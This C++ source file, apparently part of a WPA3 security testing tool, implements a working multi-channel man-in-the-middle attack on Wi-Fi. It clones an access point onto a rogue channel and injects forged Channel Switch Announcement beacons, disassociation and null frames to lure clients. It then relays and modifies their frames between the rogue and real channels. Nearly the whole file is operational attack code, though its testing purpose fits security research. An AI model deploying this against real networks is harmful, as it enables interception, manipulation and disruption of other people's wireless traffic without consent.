#include "attacks/mc_mitm/mc_mitm.h"

#include <cstring>
#include <chrono>
#include <thread>
#include <tins/tins.h>

#include "attacks/DoS_soft/channel_switch/channel_switch.h"
#include "attacks/mc_mitm/wifi_util.h"
#include "logger/log.h"
#include "system/hw_capabilities.h"

namespace wpa3_tester{
    using namespace std;
    using namespace chrono;
    using namespace Tins;

    McMitm::McMitm(const string& nic_real,
                   const string& nic_rogue,
                   const string& nic_real_mon,
                   const string& nic_rogue_mon,
                   const string& ssid,
                   const string& client_mac)
        : nic_real_ap(nic_real),
          nic_rogue_ap(nic_rogue),
          nic_real_mon(nic_real_mon),
          nic_rogue_mon(nic_rogue_mon),
          ssid(ssid),
          client_mac(client_mac)
    {}

    McMitm::~McMitm() { stop(); }

    double McMitm::now_sec() {
        return duration<double>(steady_clock::now().time_since_epoch()).count();
    }

    void McMitm::add_client(unique_ptr<ClientState> client) {
        clients[client->macaddr] = std::move(client);
    }

    void McMitm::del_client(const string& mac) {
        clients.erase(mac);
    }

    ClientState* McMitm::find_client(const string& mac) {
        const auto it = clients.find(mac);
        return (it != clients.end()) ? it->second.get() : nullptr;
    }


    void McMitm::send_disas(const string& macaddr) const {
        Dot11Disassoc pkt;
        pkt.addr1(HWAddress<6>(macaddr));
        pkt.addr2(HWAddress<6>(ap_mac));
        pkt.addr3(HWAddress<6>(ap_mac));
        pkt.reason_code(0);
        sender_rogue->send(pkt, nic_rogue_mon);
        log(LogLevel::INFO, "Rogue channel: injected Disassociation to " + macaddr);
    }

      static uint16_t get_seq_num(const Dot11& pkt) {
        if (const auto* mgmt = pkt.find_pdu<Dot11ManagementFrame>())
            return mgmt->seq_num();
        if (const auto* data = pkt.find_pdu<Dot11Data>())
            return data->seq_num();
        return 0;
    }

    string McMitm::frame_to_str(const Dot11& pkt) {
        ostringstream ss;

        if (pkt.type() == Dot11::MANAGEMENT) {
            const auto sub = pkt.subtype();
            if (sub == Dot11::BEACON)      { ss << "Beacon(seq="     << get_seq_num(pkt) << ")"; return ss.str(); }
            if (sub == Dot11::PROBE_REQ)   { ss << "ProbeReq(seq="   << get_seq_num(pkt) << ")"; return ss.str(); }
            if (sub == Dot11::PROBE_RESP)  { ss << "ProbeResp(seq="  << get_seq_num(pkt) << ")"; return ss.str(); }
            if (sub == Dot11::AUTH)        { ss << "Auth(seq="       << get_seq_num(pkt) << ")"; return ss.str(); }
            if (sub == Dot11::DEAUTH)      { ss << "Deauth(seq="     << get_seq_num(pkt) << ")"; return ss.str(); }
            if (sub == Dot11::ASSOC_REQ)   { ss << "AssoReq(seq="    << get_seq_num(pkt) << ")"; return ss.str(); }
            if (sub == Dot11::REASSOC_REQ) { ss << "ReassoReq(seq="  << get_seq_num(pkt) << ")"; return ss.str(); }
            if (sub == Dot11::ASSOC_RESP)  { ss << "AssoResp(seq="   << get_seq_num(pkt) << ")"; return ss.str(); }
            if (sub == Dot11::REASSOC_RESP){ ss << "ReassoResp(seq=" << get_seq_num(pkt) << ")"; return ss.str(); }
            if (sub == Dot11::DISASSOC)    { ss << "Disas(seq="      << get_seq_num(pkt) << ")"; return ss.str(); }
            if (sub == 13)                       { ss << "Action(seq="     << get_seq_num(pkt) << ")"; return ss.str(); }

        } else if (pkt.type() == Dot11::CONTROL) {
            if (pkt.subtype() == Dot11::BLOCK_ACK) return "BlockAck";
            if (pkt.subtype() == Dot11::RTS)       return "RTS";
            if (pkt.subtype() == Dot11::ACK)       return "Ack";

        } else if (pkt.type() == Dot11::DATA) {
            if (pkt.subtype() == Dot11::DATA_NULL)
                { ss << "Null(seq="    << get_seq_num(pkt) << ")"; return ss.str(); }
            if (pkt.subtype() == Dot11::QOS_DATA_NULL)
                { ss << "QoS-Null(seq=" << get_seq_num(pkt) << ")"; return ss.str(); }
        }

        ss << "Frame(type=" << pkt.type() << ",sub=" << pkt.subtype() << ")";
        return ss.str();
    }

    void McMitm::print_rx(const LogLevel level, const string& prefix,
                          const Dot11& pkt, const string& suffix) {
        if (pkt.type() == Dot11::CONTROL) return;

        string addr2;
        if (const auto* mgmt = pkt.find_pdu<Dot11ManagementFrame>()) {
            addr2 = mgmt->addr2().to_string();
        } else if (const auto* data = pkt.find_pdu<Dot11Data>()) {
            addr2 = data->addr2().to_string();
        }
        string msg = prefix + ": " +addr2 + " -> " +
                     pkt.addr1().to_string() + ": " + frame_to_str(pkt);
        if (!suffix.empty()) msg += suffix;
        log(level, msg);
    }

    double McMitm::display_client_traffic(const Dot11& pkt,
                                          const string& prefix,
                                          const double prevtime,
                                          const string& suffix) {
        const bool is_data = (pkt.type() == Dot11::DATA);
        const bool is_null = is_data && (pkt.subtype() == Dot11::DATA_NULL ||
                                         pkt.subtype() == Dot11::QOS_DATA_NULL);

        bool is_eapol = false;
        if (const auto* raw = pkt.find_pdu<RawPDU>()) {
            const auto& d = raw->payload();
            for (size_t i = 0; i + 1 < min(d.size(), static_cast<size_t>(16)); i++) {
                if (d[i] == 0x88 && d[i+1] == 0x8e) { is_eapol = true; break; }
            }
        }

        if (is_eapol)     print_rx(LogLevel::INFO,  prefix, pkt, suffix);
        else if (is_null) print_rx(LogLevel::DEBUG, prefix, pkt, suffix);
        else if (is_data) print_rx(LogLevel::INFO,  prefix, pkt, suffix);
        else              print_rx(LogLevel::DEBUG, prefix, pkt, suffix);

        return prevtime;
    }

    void McMitm::handle_rx_real_chan(PDU& pdu) {
        const auto* dot11 = pdu.find_pdu<Dot11>();
        if (!dot11) return;

        const string addr1 = dot11->addr1().to_string();
        string addr2;
        if (const auto* mgmt = pdu.find_pdu<Dot11ManagementFrame>()) {
            addr2 = mgmt->addr2().to_string();
        } else if (const auto* data = pdu.find_pdu<Dot11Data>()) {
            addr2 = data->addr2().to_string();
        }

        // Probe requests
        if (dot11->type() == Dot11::MANAGEMENT && dot11->subtype() == Dot11::PROBE_REQ) {
            probe_resp->addr1(HWAddress<6>(addr2));
            sender_real->send(*probe_resp, nic_real_mon);
            last_print_real_chan = display_client_traffic(*dot11, "Real channel", last_print_real_chan, " -- Replied");
            return;
        }

        // Frames sent TO the real AP
        if (addr1 == ap_mac) {
            if (dot11->type() == Dot11::MANAGEMENT && dot11->subtype() == Dot11::AUTH) {
                print_rx(LogLevel::INFO, "Real channel", *dot11);

                if (client_mac == addr2)
                    log(LogLevel::WARNING, "Client "+client_mac+" is connecting on real channel, injecting CSA beacon to try to correct.");

                del_client(addr2);
                CSA_attack::send_CSA_beacon(ap_mac, nic_real_mon, ssid, netconfig.real_channel,  netconfig.rogue_channel);
                CSA_attack::send_CSA_beacon("ff:ff:ff:ff:ff:ff", nic_real_mon, ssid, netconfig.real_channel,  netconfig.rogue_channel);

                auto client = make_unique<ClientState>(addr2);
                client->update_state(ClientState::Connecting);
                add_client(std::move(client));

            } else if (dot11->type() == Dot11::MANAGEMENT &&
                       (dot11->subtype() == Dot11::DEAUTH || dot11->subtype() == Dot11::DISASSOC)) {
                print_rx(LogLevel::INFO, "Real channel", *dot11);
                del_client(addr2);

            } else if (auto* client = find_client(addr2)) {
                client->last_real = display_client_traffic(*dot11, "Real channel", client->last_real);

            } else if (!client_mac.empty() && client_mac == addr2) {
                last_print_rogue_chan = display_client_traffic(*dot11, "Real channel", last_print_rogue_chan);
            }

            // Warn if client is going to sleep (power management bit in FC)
            if ( dot11->power_mgmt() != 0) {
                const auto* c = find_client(addr2);
                if (c && c->state < ClientState::Attack_Done) {
                    log(LogLevel::WARNING, "Client " + addr2 + " is going to sleep while on real channel. Injecting Null frame.");
                    Dot11Data null_frame;
                    null_frame.type(Dot11::DATA);
                    null_frame.subtype(Dot11::DATA_NULL);
                    null_frame.addr1(HWAddress<6>(ap_mac));
                    null_frame.addr2(HWAddress<6>(addr2));
                    null_frame.addr3(HWAddress<6>(ap_mac));
                    sender_real->send(null_frame, nic_real_mon);
                }
            }
            return;
        }

        // 3. Frames sent BY the real AP
        if (addr2 == ap_mac) {
            // Track beacons for watchdog
            if (dot11->subtype() == Dot11::BEACON) {
                const auto* b = pdu.find_pdu<Dot11Beacon>();
                const auto* ch_ie = b ? get_element(*b, IEEE_TLV_TYPE_CHANNEL) : nullptr;
                if (ch_ie && ch_ie->data_ptr()[0] == netconfig.real_channel)
                    last_real_beacon = now_sec();
            }

            bool might_forward = false;
            if (const auto* client = find_client(addr1))
                might_forward = client->should_forward(pdu);
            if (dot11_is_group(*dot11))
                might_forward = true;

            const bool is_deauth_or_disas = (dot11->type() == Dot11::MANAGEMENT &&
                                             (dot11->subtype() == Dot11::DEAUTH ||
                                              dot11->subtype() == Dot11::DISASSOC));
            if (is_deauth_or_disas) {
                print_rx(LogLevel::INFO, "Real channel", *dot11, might_forward ? " -- MitM'ing" : "");
            } else if (!client_mac.empty() && client_mac == addr1) {
                last_print_rogue_chan = display_client_traffic(*dot11, "Real channel",
                                        last_print_rogue_chan, might_forward ? " -- MitM'ing" : "");
            } else if (might_forward) {
                print_rx(LogLevel::INFO, "Real channel", *dot11, " -- MitM");
            }

            if (might_forward) {
                if (auto* client = find_client(addr1)) {
                    auto* modified = client->modify_packet(&pdu);
                    if (auto* mod_dot11 = modified->find_pdu<Dot11>())
                        sender_rogue->send(*mod_dot11, nic_rogue_mon);
                }
            }

            if (dot11->subtype() == Dot11::DEAUTH && dot11->type() == Dot11::MANAGEMENT)
                del_client(addr1);
            return;
        }

        // 4. Any other frame involving the targeted client
        if (!client_mac.empty() && (client_mac == addr1 || client_mac == addr2))
            last_print_rogue_chan = display_client_traffic(*dot11, "Real channel", last_print_rogue_chan);
    }

    void McMitm::handle_rx_rogue_chan(PDU& pdu) {
        auto* dot11 = pdu.find_pdu<Dot11>();
        if (!dot11) return;

        const string addr1 = dot11->addr1().to_string();
        string addr2;
        if (const auto* mgmt = pdu.find_pdu<Dot11ManagementFrame>()) {
            addr2 = mgmt->addr2().to_string();
        } else if (const auto* data = pdu.find_pdu<Dot11Data>()) {
            addr2 = data->addr2().to_string();
        }

        // 1. Frames sent by our own rogue AP interface
        if (addr2 == ap_mac) {
            if (dot11->subtype() == Dot11::BEACON) {
                const auto* b = pdu.find_pdu<Dot11Beacon>();
                const auto* ch_ie = b ? get_element(*b, IEEE_TLV_TYPE_CHANNEL) : nullptr;
                if (ch_ie && ch_ie->data_ptr()[0] == netconfig.rogue_channel)
                    last_rogue_beacon = now_sec();
            }
            if (!client_mac.empty() && addr1 == client_mac)
                last_print_real_chan = display_client_traffic(*dot11, "Rogue channel", last_print_real_chan);
            else if (auto* client = find_client(addr1))
                client->last_rogue = display_client_traffic(*dot11, "Rogue channel", client->last_rogue);
            return;
        }

        // 2. Probe requests on rogue channel
        if (dot11->type() == Dot11::MANAGEMENT && dot11->subtype() == Dot11::PROBE_REQ) {
            probe_resp->addr1(HWAddress<6>(addr2));
            sender_rogue->send(*probe_resp, nic_rogue_mon);
            last_print_real_chan = display_client_traffic(*dot11, "Rogue channel", last_print_real_chan, " -- Replied");
            return;
        }

        // 3. Frames sent TO the AP (from clients)
        if (addr1 == ap_mac) {
            ClientState* client = find_client(addr2);
            bool will_forward = false;

            const bool is_auth_or_asso = (dot11->type() == Dot11::MANAGEMENT &&
                                          (dot11->subtype() == Dot11::AUTH ||
                                           dot11->subtype() == Dot11::ASSOC_REQ));
            if (client) {
                will_forward = client->should_forward(pdu);

                if (is_auth_or_asso || client->state <= ClientState::Connecting) {
                    print_rx(LogLevel::INFO, "Rogue channel", *dot11, " -- MitM'ing");
                    client->mark_got_mitm();
                } else {
                    client->last_rogue = display_client_traffic(*dot11, "Rogue channel",
                                            client->last_rogue, " -- MitM'ing");
                }
            } else if (is_auth_or_asso || dot11->type() == Dot11::DATA) {
                print_rx(LogLevel::INFO, "Rogue channel", *dot11, " -- MitM'ing");
                auto new_client = make_unique<ClientState>(addr2);
                new_client->mark_got_mitm();
                add_client(std::move(new_client));
                client = find_client(addr2);
                will_forward = true;
            } else if (!client_mac.empty() && addr2 == client_mac) {
                last_print_real_chan = display_client_traffic(*dot11, "Rogue channel", last_print_real_chan);
            }

            if (client && will_forward) {
                if (dot11->power_mgmt() != 0 && client->state < ClientState::Attack_Done) {
                    log(LogLevel::WARNING, "Client " + addr2 + " is going to sleep while on rogue channel. Removing sleep bit.");
                }
                sender_real->send(*dot11, nic_real_mon);
            }
            return;
        }

        // 4. Any other frame involving the targeted client
        if (!client_mac.empty() && (client_mac == addr1 || client_mac == addr2))
            last_print_real_chan = display_client_traffic(*dot11, "Rogue channel", last_print_real_chan);
    }

    void McMitm::run(const int timeout_sec) {
        probe_resp.reset(beacon_to_probe_resp(*beacon));

        //FIXME this should be optimalization, how it should works?
        /*Dot11Deauthentication deauth;
        deauth.addr1(HWAddress<6>("ff:ff:ff:ff:ff:ff"));
        deauth.addr2(HWAddress<6>(ap_mac));
        deauth.addr3(HWAddress<6>(ap_mac));
        deauth.reason_code(3);
        RadioTap radio = RadioTap() / deauth;
        sender_real->send(radio, nic_real_mon);*/

        if (!sniffer_real || !sniffer_rogue) {
            log(LogLevel::ERROR, "Sniffers not initialized before run()");
            return;
        }
        if (!beacon) {
            log(LogLevel::ERROR, "Beacon not set before run()");
            return;
        }

        CSA_attack::send_CSA_beacon(ap_mac, nic_real_mon, ssid,
            netconfig.real_channel, netconfig.rogue_channel);

        last_real_beacon  = now_sec();
        last_rogue_beacon = now_sec();
        double next_beacon  = now_sec() + 0.01;
        const double deadline = (timeout_sec > 0) ? now_sec() + timeout_sec : -1.0;

        while (true) {
            if (deadline > 0 && now_sec() > deadline) {
                log(LogLevel::INFO, "McMitm timeout reached, stopping.");
                break;
            }

            auto try_sniff = [&](Sniffer& sniffer, void (McMitm::*handler)(PDU&)) {
                if (PDU* pdu = sniffer.next_packet()) {
                    (this->*handler)(*pdu);
                    delete pdu;
                }
            };

            try_sniff(*sniffer_real,  &McMitm::handle_rx_real_chan);
            try_sniff(*sniffer_rogue, &McMitm::handle_rx_rogue_chan);

            while (!disas_queue.empty() && disas_queue.top().first <= now_sec()) {
                string mac = disas_queue.top().second;
                disas_queue.pop();
                send_disas(mac);
            }

            if (next_beacon <= now_sec()) {
                CSA_attack::send_CSA_beacon(ap_mac, nic_real_mon, ssid, netconfig.real_channel,  netconfig.rogue_channel);
                next_beacon += 0.10;
            }

            if (last_real_beacon + 2.0 < now_sec()) {
                log(LogLevel::WARNING, "Didn't receive beacon from real AP for two seconds");
                last_real_beacon = now_sec();
            }
            if (last_rogue_beacon + 2.0 < now_sec()) {
                log(LogLevel::WARNING, "Didn't receive beacon from rogue AP for two seconds");
                last_rogue_beacon = now_sec();
            }
            this_thread::sleep_for(milliseconds(1));
        }
    }

    void McMitm::stop() {
        log(LogLevel::INFO, "Cleaning up ...");
        sniffer_real.reset();
        sniffer_rogue.reset();
        sender_real.reset();
        sender_rogue.reset();
    }
}
